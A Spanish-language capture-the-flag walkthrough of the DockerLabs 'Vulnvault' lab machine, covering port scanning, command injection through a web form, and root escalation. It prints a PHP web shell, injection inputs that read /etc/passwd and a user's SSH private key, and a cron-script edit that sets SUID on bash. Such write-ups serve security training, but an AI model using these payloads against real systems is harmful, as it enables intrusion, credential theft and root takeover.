# Máquina Vulnvault

Enlace a la máquina -> [Dockerlabs](https://mega.nz/file/1asGQbRK#zvWJuwPfUI0P43b2YDBesILqJogA3tv3SVQn4oORmSI)

![imagen](https://github.com/user-attachments/assets/b937f6b2-9b8a-42a4-a96d-c0f091d31d9d)

- **Nombre de la Máquina:** Vulnvault
- **Sistema Operativo:** Linux
- **Dificultad:** Fácil
- **Plataforma:** DockerLabs
- **Dirección IP:** 172.17.0.2
- **Vulnerabilidades Explotadas:**
  - Inyección de Comandos en la aplicación web para ejecutar comandos y obtener archivos sensibles como /etc/passwd y id_rsa.
- **Escalada de Privilegios:**
  - Modificación de Script Root, aprovechando permisos de escritura para añadir SUID a /bin/bash.

## Reconocimiento y Enumeración
Iniciamos un escaneo general utilizando Nmap para identificar los puertos abiertos en la IP del objetivo.

```bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oN escaneo.txt
```

![imagen](https://github.com/user-attachments/assets/9f4569f9-2dbd-4c20-a697-512a28d6df7b)

El escaneo muestra que los puertos 22 y 80 están abiertos. Realizamos un análisis más detallado para determinar qué servicios se están ejecutando en estos puertos.

```bash
sudo nmap -p 22,80 -sCV 172.17.0.2 -oN targeted.txt
```

![imagen](https://github.com/user-attachments/assets/4b799070-2115-4d9c-916d-bf744824459f)

### Puerto 80 HTTP
Lanzamos un `whatweb` para ver qué servicios corren en el puerto HTTP.

![imagen](https://github.com/user-attachments/assets/38d529ad-4c2e-40b7-9bff-57dd3090b300)

Al ingresar la dirección ip en el navegador, observamos la siguiente web.

![imagen](https://github.com/user-attachments/assets/e8b57ab6-7546-4af1-9536-98527df68d2c)

Vemos un botón que nos lleva a un directorio donde podemos subir archivos.

![imagen](https://github.com/user-attachments/assets/ab654f53-ed51-425b-aad3-9993ffcec5f6)

Hice un script en php para crear un parámetro con el que pueda ejecutar comandos y lo subí.

```php
<?php
  system($_GET["cmd"]);
?>
```

![imagen](https://github.com/user-attachments/assets/0a45e50b-783f-448b-a52f-08bd4485bbd0)

Salta una alerta diciendo que se subió correctamente pero no me muestra el directorio de donde se subió.

Revisando la web me doy cuenta que en los reportes sale una pista que dice lo siguiente:

```pista
Este sistema también está diseñado para demostrar la importancia de la seguridad en la generación de comandos. La entrada de datos debe ser manejada con cuidado para evitar la inyección de comandos maliciosos.
```

Probé ingresar varios comandos y descubrí que al utilizar ;ls, el comando se ejecutaba correctamente, mostrando el resultado en un archivo .txt visible desde la web.

![imagen](https://github.com/user-attachments/assets/45d2dff4-0339-48e6-addf-7a8d0ec5fdc7)

Al tener ejecución de comandos voy a leer el `/etc/passwd` con ingresando el siguiente comando en el input `;cat /etc/passwd`.

![imagen](https://github.com/user-attachments/assets/1b24cab2-ff41-443c-9ac8-cec9d16eac27)

Vemos que solo existe un usuario llamado **samara**, intenté hacer fuerza bruta por ssh pero no logré la contraseña así que seguí investigando y ví que tiene una carpeta `.ssh` en su directorio personal.

![imagen](https://github.com/user-attachments/assets/ad83f05c-36bb-44d9-b16c-b0e98e51bef9)

![imagen](https://github.com/user-attachments/assets/506e7f96-ef1d-4a53-81ab-85b59343683b)

Observamos que tiene dentro el archivo `id_rsa` así que lo veremos con ingresando el comando `;cat /home/samara/.ssh/id_rsa`.

![imagen](https://github.com/user-attachments/assets/67bfdccf-f6f4-46ac-81a2-53c6f68fd609)

Lo copiamos y lo pegamos en nuestra máquina atacante para ingresar vía ssh, cambiaremos los permisos del archivo id_rsa con el comando `chmod 700 id_rsa`.

```bash
ssh samara@172.17.0.2 -i id_rsa
```

![imagen](https://github.com/user-attachments/assets/dbba1f18-000a-4f8d-8c18-b45058fe0c2e)

## Escalada de privilegios a root
Vemos un par de archivosc .txt pero no contienen nada relevante.

![imagen](https://github.com/user-attachments/assets/584bcfe2-abb3-4c91-a78e-b6f50798abe6)

Miro a ver is tiene permisos sudo o SUID y tampoco vemos nada.

![imagen](https://github.com/user-attachments/assets/bf7fe0c9-0f72-4b44-86b3-74695406f2ad)

Seguí investigando hasta que decidí ver los procesos que se ejecutaban con el programa [pspy](https://github.com/DominicBreuker/pspy/releases). Transferí la herramienta pspy a la máquina víctima utilizando el siguiente comando:

```bash
python3 -m http.server 80
```

![imagen](https://github.com/user-attachments/assets/c9ade767-255a-4871-a9d9-bb716ae221d9)

```bash
wget http://172.17.0.1/pspy64
```

![imagen](https://github.com/user-attachments/assets/a97a85bb-7ee4-4a9e-816c-b7cfd058b48f)

Le damos permisos de ejecución y lo ejecutamos.

```bash
chmod +x pspy64
./pspy64
```

![imagen](https://github.com/user-attachments/assets/0b5ea009-b79f-4f5a-94ab-5270ea929afe)

Observamos que se está ejecutando constantemente el archivo `echo.sh` dentro de la ruta `/usr/local/bin/echo.sh`. Si hacemos un cat del archivo vemos lo siguiente:

```bash
#!/bin/bash

echo "No tienes permitido estar aqui :(." > /home/samara/message.txt
```

Vemos que tnemos permisos de escritura así que modificaremos el script para que otorgue permisos SUID a la bash ya que el script lo ejecuta root automáticamente.

![imagen](https://github.com/user-attachments/assets/efa6f003-58b0-45ea-8676-e46de89261da)

```bash
nano /usr/local/bin/echo.sh
#!/bin/bash
chmod u+s /usr/bin/bash
```

![imagen](https://github.com/user-attachments/assets/7c17101f-f301-4d35-ba5c-60fd9ed9e876)

Una vez cambiado los permisos SUID, ejecutando el comando `bash -p` obtendremos una bash privilegiada con permisos root.

![imagen](https://github.com/user-attachments/assets/e182d3d3-c98a-49de-b9b7-ad6139a17459)
